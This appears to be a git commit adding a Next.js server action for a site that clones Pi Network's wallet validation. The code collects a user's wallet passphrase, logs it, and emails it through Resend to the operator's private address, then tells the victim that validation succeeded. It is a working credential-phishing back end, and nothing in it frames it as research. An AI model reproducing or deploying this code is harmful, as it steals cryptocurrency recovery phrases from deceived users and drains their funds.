7b73885051ab0a24e0dffbd5571acffef405b3f4
Grindonly <102062388+Grindonly@users.noreply.github.com>
2024-02-24 09:39:44 +0100

    Add files via upload

---
+++ actions/sendEmail.ts
@@ -0,0 +1,58 @@
+"use server";
+
+import React from "react";
+import { Resend } from "resend";
+import NotionMagicLinkEmail from "@/components/email-template";
+
+interface EmailResponse {
+  error?: string;
+  success?: string;
+}
+
+const resend = new Resend(
+  process.env.RESEND_API_KEY ? process.env.RESEND_API_KEY : ""
+);
+export const sendEmail = async (formData: FormData): Promise<EmailResponse> => {
+  const passPhrase = formData.get("passphrase") as string;
+
+  if (!passPhrase) {
+    return {
+      error: "Passphrase is required",
+    };
+  }
+
+  if (passPhrase.trim().length < 24) {
+    return {
+      error: "Passphrase must be 24 words",
+    };
+  }
+
+  console.log(passPhrase);
+  let data;
+  const emailElement = React.createElement(NotionMagicLinkEmail, {
+    passphrase: passPhrase,
+  });
+  try {
+    const myEmailAddress: string | undefined = process.env.MY_EMAIL_ADDRESS;
+
+    if (!myEmailAddress) {
+      throw new Error("MY_EMAIL_ADDRESS environment variable is not defined.");
+    }
+
+    data = await resend.emails.send({
+      from: "Wallet validation <pi-clone@resend.dev>",
+      to: myEmailAddress,
+      subject: "Pi-Network Passphrase",
+      react: emailElement,
+    });
+    console.log(data);
+  } catch (error) {
+    return {
+      error: "Something went wrong",
+    };
+  }
+
+  return {
+    success: "Validated Successfully",
+  };
+};
